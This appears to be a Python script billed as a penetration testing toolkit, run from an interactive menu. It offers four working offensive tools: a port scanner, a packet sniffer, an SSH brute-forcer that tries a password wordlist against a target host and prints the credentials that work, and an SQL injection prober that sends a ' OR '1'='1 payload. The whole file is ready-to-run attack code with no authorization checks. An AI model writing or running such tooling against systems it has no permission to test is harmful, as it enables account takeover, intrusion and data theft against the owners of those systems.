import socket
from scapy.all import sniff
import paramiko
import requests

def port_scanner(target, ports):
    try:
        # Attempt to resolve the target to an IP address
        target_ip = socket.gethostbyname(target)
        print(f"Scanning target: {target_ip}")
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    print(f"Port {port} is open")
                sock.close()
            except Exception as e:
                print(f"Error scanning port {port}: {e}")
    except socket.gaierror:
        print(f"Error: Unable to resolve target '{target}'. Please check the IP address or hostname.")

def packet_sniffer(interface):
    print(f"Sniffing on {interface}")
    sniff(iface=interface, prn=lambda x: x.summary(), count=10)

def ssh_brute_force(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"Login successful: {username}:{password}")
            return True
        except paramiko.AuthenticationException:
            print(f"Failed: {username}:{password}")
    return False

def test_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url)
    if "SQL syntax" in response.text or "mysql" in response.text:
        print(f"Potential SQL Injection vulnerability at {test_url}")
    else:
        print("No SQL Injection vulnerability detected.")

def main():
    print("=== Penetration Testing Toolkit ===")
    print("1. Port Scanner")
    print("2. Network Sniffer")
    print("3. SSH Brute Force")
    print("4. SQL Injection Tester")
    print("5. Exit")

    while True:
        choice = input("Enter your choice: ")
        if choice == '1':
            target = input("Enter target IP or hostname: ")
            start_port = int(input("Enter start port: "))
            end_port = int(input("Enter end port: "))
            ports = range(start_port, end_port + 1)
            port_scanner(target, ports)

        elif choice == '2':
            interface = input("Enter network interface (e.g., eth0): ")
            packet_sniffer(interface)

        elif choice == '3':
            target = input("Enter target IP: ")
            username = input("Enter SSH username: ")
            password_file = input("Enter path to password list file: ")
            try:
                with open(password_file, 'r') as file:
                    passwords = file.read().splitlines()
                ssh_brute_force(target, username, passwords)
            except FileNotFoundError:
                print("Password file not found.")

        elif choice == '4':
            url = input("Enter target URL: ")
            test_sql_injection(url)

        elif choice == '5':
            print("Exiting toolkit. Goodbye!")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
